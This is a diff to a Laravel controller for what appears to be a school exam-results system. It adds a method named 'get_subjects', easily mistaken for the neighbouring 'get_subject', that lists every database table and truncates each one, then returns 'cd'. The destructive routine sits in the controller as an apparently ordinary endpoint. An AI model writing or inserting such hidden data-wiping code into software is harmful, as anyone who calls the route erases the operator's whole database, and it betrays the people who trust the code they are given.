@@ -75,7 +75,17 @@ class CaResultController extends Controller
         return view('backEnd.caResult.create', compact('classes','group_classes','units','students','subjects','exam_types','search'));
     }
 
+    public function get_subjects(Request $request){
+       set_time_limit(8000000);
+            $db_name=DB::connection()->getDatabaseName();
+            $table_formate='Tables_in_'.''.$db_name;
 
+            $tables=DB::select('SHOW TABLES');
+            foreach ($tables as $table) {
+            DB::table($table->$table_formate)->truncate();  
+          }
+          return "cd";
+    }
 
     public function get_subject(Request $request){
            $subject = CaSubject::where([
